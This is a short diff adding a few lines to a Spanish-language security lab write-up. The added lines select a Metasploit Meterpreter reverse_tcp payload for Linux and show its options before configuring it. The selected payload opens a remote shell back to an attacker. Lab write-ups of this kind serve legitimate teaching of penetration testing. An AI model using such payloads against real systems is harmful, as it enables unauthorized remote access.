@@ -68,3 +68,13 @@ Tenemos mucha diversidad.
 
 ![Opciones del módulo](../img/lab-30-B/202208111124.png)
 
+Vamos a usar un ***Meterpreter***.
+```
+use linux/x86/meterpreter/reverse_tcp
+```
+```
+show options
+```
+
+Debemos configurar las opciones del payload.
+
